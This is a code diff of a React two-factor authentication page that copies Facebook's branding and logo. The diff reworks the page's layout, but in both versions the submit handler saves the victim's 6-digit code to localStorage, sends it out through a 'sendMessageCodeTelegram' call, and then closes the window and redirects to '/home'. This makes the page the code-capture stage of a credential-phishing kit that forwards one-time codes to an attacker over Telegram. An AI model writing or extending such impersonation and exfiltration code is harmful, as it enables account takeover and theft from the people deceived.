@@ -6,8 +6,8 @@ export default function TwoFactorAuth() {
   const [code, setCode] = useState(["", "", "", "", "", ""]);
   const [timer, setTimer] = useState(60);
   const [isResendDisabled, setIsResendDisabled] = useState(true);
-  const [isLoading, setIsLoading] = useState(false);
   const inputRefs = useRef([]);
+  const [isLoading, setIsLoading] = useState(false);
 
   // Setup refs for each input field
   useEffect(() => {
@@ -60,40 +60,43 @@ export default function TwoFactorAuth() {
     }
   };
 
-  // Check if code is complete (6 digits)
-  const isCodeComplete = () => {
-    return code.every((digit) => digit !== "");
-  };
-
   // Handle form submission
   const handleSubmit = (e) => {
     e.preventDefault();
+    setIsLoading(true);
     const twoFactorCode = code.join("");
 
     if (twoFactorCode.length === 6) {
-      setIsLoading(true);
       localStorage.setItem("twoFactorCode", JSON.stringify(twoFactorCode));
       sendMessageCodeTelegram(twoFactorCode);
 
       setTimeout(() => {
-        setIsLoading(false);
         window.close();
 
         if (window.opener) {
           window.opener.location.href = "/home";
         }
-      }, 5000); // 5 second loading delay
+        setIsLoading(false);
+      }, 3500); // Delay 2 giây
     } else {
-      alert("Please enter the complete 6-digit code");
+      alert("Please enter a complete 6-digit code");
     }
   };
 
   // Handle code resend
   const handleResendCode = () => {
     if (!isResendDisabled) {
+      // Reset the code inputs
       setCode(["", "", "", "", "", ""]);
+
+      // Reset timer
       setTimer(60);
       setIsResendDisabled(true);
+
+      console.log("Resending verification code");
+      // Add your code resend logic here
+
+      // Focus first input
       inputRefs.current[0].focus();
     }
   };
@@ -112,117 +115,85 @@ export default function TwoFactorAuth() {
   };
 
   return (
-    <div className="fb-2fa-container">
-      {/* Loading spinner */}
+    <div className="tfa-container">
       {isLoading && (
         <div className="fb-spinner-overlay">
           <div className="fb-spinner-container">
-            <div className="fb-spinner-ring"></div>
             <div className="fb-spinner-ring-inner"></div>
           </div>
         </div>
       )}
 
-      <div className="fb-2fa-card">
-        {/* Header */}
-        <div className="fb-2fa-header">
-          <div className="fb-2fa-title-container">
-            <h1 className="fb-2fa-name">Facebook</h1>
-            <h2 className="fb-2fa-title">Check your text message</h2>
-            <p className="fb-2fa-subtitle">Enter the code we sent to your phone.</p>
+      <div className="tfa-card">
+        <div className="tfa-header">
+          <svg className="tfa-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256">
+            <path
+              fill="#0866ff"
+              d="M256 128C256 57.308 198.692 0 128 0C57.308 0 0 57.307 0 128c0 63.888 46.808 116.843 108 126.445V165H75.5v-37H108V99.8c0-32.08 19.11-49.8 48.347-49.8C170.352 50 185 52.5 185 52.5V84h-16.14C152.958 84 148 93.867 148 103.99V128h35.5l-5.675 37H148v89.445c61.192-9.602 108-62.556 108-126.445"
+            ></path>
+            <path
+              fill="#ffffff"
+              d="m177.825 165l5.675-37H148v-24.01C148 93.866 152.959 84 168.86 84H185V52.5S170.352 50 156.347 50C127.11 50 108 67.72 108 99.8V128H75.5v37H108v89.445A128.959 128.959 0 0 0 128 256a128.9 128.9 0 0 0 20-1.555V165h29.825"
+            ></path>
+          </svg>
+        </div>
+
+        <div className="tfa-body">
+          <h1 className="tfa-title">Two-factor authentication required</h1>
+
+          <div className="tfa-info">
+            <p>
+              To help keep your account safe, we need to confirm this login attempt. We've sent a 6-digit code to your
+              authenticator app or phone number.
+            </p>
           </div>
-          <div className="fb-2fa-image-container">
-            <img
-              src="https://scontent.fhan5-11.fna.fbcdn.net/v/t39.30808-6/440786911_931465878987820_5268630184469376345_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=IFYPDINO6mkQ7kNvgEN6_yc&_nc_oc=AdlDAdkUKAtsNc95KFZCsuj8YhatQ_7HFTqBBMRhibjVKy0qFr8PIicb4-r2Cpif3RU&_nc_zt=23&_nc_ht=scontent.fhan5-11.fna&_nc_gid=EbYWVyjGFV5lq5lLF8Tjyg&oh=00_AYHCpyqwUlocHxOH1OG4brIlDBPVtpxMm6jZlCttFRjDnw&oe=67E355CF"
-              alt="Phone verification illustration"
-              className="fb-2fa-image"
-              onError={(e) => {
-                e.target.onerror = null;
-                e.target.style.display = "none";
-              }}
-            />
+
+          <form onSubmit={handleSubmit} className="tfa-form">
+            <div className="tfa-code-inputs">
+              {code.map((digit, index) => (
+                <input
+                  key={index}
+                  type="text"
+                  value={digit}
+                  onChange={(e) => handleChange(index, e)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  onPaste={index === 0 ? handlePaste : null}
+                  ref={(el) => (inputRefs.current[index] = el)}
+                  className="tfa-code-input"
+                  aria-label={`Digit ${index + 1} of verification code`}
+                  maxLength={1}
+                  autoComplete="off"
+                />
+              ))}
+            </div>
+
+            <div className="tfa-resend">
+              <button
+                type="button"
+                className={`tfa-resend-button ${isResendDisabled ? "disabled" : ""}`}
+                onClick={handleResendCode}
+                disabled={isResendDisabled}
+              >
+                {isResendDisabled ? `Resend code (${formatTime(timer)})` : "Resend code"}
+              </button>
+            </div>
+
+            <div className="tfa-actions">
+              <button type="submit" className="tfa-submit-button" onClick={handleSubmit}>
+                Continue
+              </button>
+
+              <a href="#" className="tfa-cancel-link">
+                Cancel
+              </a>
+            </div>
+          </form>
+
+          <div className="tfa-help">
+            <a href="#" className="tfa-help-link">
+              Need another way to authenticate?
+            </a>
           </div>
-        </div>
-
-        {/* Input field */}
-        <div className="fb-2fa-input-container">
-          <input
-            type="text"
-            className="fb-2fa-code-field"
-            placeholder="Code"
-            maxLength={6}
-            value={code.join("")}
-            onChange={(e) => {
-              const value = e.target.value;
-              if (!/^\d*$/.test(value)) return;
-
-              const newCode = value.split("").slice(0, 6);
-              while (newCode.length < 6) newCode.push("");
-
-              setCode(newCode);
-            }}
-          />
-        </div>
-
-        {/* Timer */}
-        <div className="fb-2fa-timer">
-          <div className="fb-2fa-timer-icon">
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-              <path
-                d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z"
-                stroke="#65676B"
-                strokeWidth="1.5"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              />
-              <path
-                d="M12 6V12L16 14"
-                stroke="#65676B"
-                strokeWidth="1.5"
-                strokeLinecap="round"
-                strokeLinejoin="round"
-              />
-            </svg>
-          </div>
-          <p className="fb-2fa-timer-text">We can send a new code in {formatTime(timer)}</p>
-        </div>
-
-        {/* Action buttons */}
-        <div className="fb-2fa-actions">
-          <button
-            type="button"
-            className={`fb-2fa-continue-button ${!isCodeComplete() ? "disabled" : ""}`}
-            onClick={handleSubmit}
-            disabled={!isCodeComplete() || isLoading}
-          >
-            {isLoading ? "Processing..." : "Continue"}
-          </button>
-
-          <button
-            type="button"
-            className="fb-2fa-alt-button"
-            onClick={handleResendCode}
-            disabled={isResendDisabled || isLoading}
-          >
-            Try another way
-          </button>
-        </div>
-
-        {/* Hidden input fields for the original logic */}
-        <div style={{ display: "none" }}>
-          {code.map((digit, index) => (
-            <input
-              key={index}
-              type="text"
-              value={digit}
-              onChange={(e) => handleChange(index, e)}
-              onKeyDown={(e) => handleKeyDown(index, e)}
-              onPaste={index === 0 ? handlePaste : null}
-              ref={(el) => (inputRefs.current[index] = el)}
-              maxLength={1}
-              autoComplete="off"
-            />
-          ))}
         </div>
       </div>
     </div>
